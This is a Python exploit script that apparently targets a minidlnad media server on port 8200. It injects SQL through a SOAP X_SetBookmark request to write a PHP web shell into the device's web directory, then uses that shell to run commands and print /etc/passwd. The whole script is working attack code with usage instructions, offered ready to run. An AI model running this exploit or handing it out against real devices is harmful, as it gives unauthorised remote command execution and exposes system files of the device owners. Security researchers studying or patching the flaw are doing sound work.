from urllib import parse

import socket
import sys

def do_cmd(ip, name, cmd):
    cmd = parse.quote(cmd)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip, 80))
    req = f"""GET /shares/{name}.php?cmd={cmd} HTTP/1.1
Host: {ip}

"""
    req = req.replace("\n", "\r\n")
    req = req.encode()
    s.send(req)
    data = b""
    while b"content-length: " not in data.lower():
        data += s.recv(0x1000)
    content_length = int(data.lower().split(b"content-length: ", 1)[1].split(b'\r\n', 1)[0])
    data = data.split(b'\r\n\r\n', 1)[1]
    content_length -= len(data)
    while content_length > 0:
        temp = s.recv(0x1000)
        data += temp
        content_length -= len(temp)

    result = data.split(b"aaaa", 1)[1].rsplit(b"bbbb", 1)[0]
    print(result.decode())
    s.close()


def main(ip, port):
    table = "shell"

    payload = 'aaaa<?php system($_GET["cmd"]); ?>bbbb'
    payload = 'char(' + ','.join([hex(ord(c)) for c in payload]) + ')'
    query = [
        f'ATTACH DATABASE "/webs/shares/{table}.php" AS {table}',
        f'CREATE TABLE {table}.pwn (dataz text)',
        f'INSERT INTO {table}.pwn (dataz) VALUES ({payload})'
    ]

    query = "2);%s;--" % ';'.join(query)
    assert(not "'" in query)

    body = f"""
<?xml version="1.0" encoding="utf-8" ?>
<soap:Envelope>
  <soap:Body>
    <ObjectID>1<ObjectID>
    <PosSecond>{query}<PosSecond>
  </soap:Body>
</soap:Envelope>
"""

    header = f"""POST / HTTP/1.1
Content-Type: text/xml; charset=utf-8
SOAPAction: #X_SetBookmark
Content-Length: {len(body)}

"""

    req = header.replace("\n", "\r\n") + body
    req = req.encode()

    print("[*] Create web shell")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip, port))
    s.send(req)
    s.recv(0x1000)
    s.close()
    print(f"[*] Now you can use webshell via `http://{ip}/shares/{table}.php?cmd=[your shell command]`")
    print("[*] Print `cat /etc/passwd` result")

    do_cmd(ip, table, "cat /etc/passwd")


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"Usage: python3 {sys.argv[0]} <IP address>", file=sys.stderr)
        exit()
    # minidlnad port: 8200
    main(sys.argv[1], 8200)
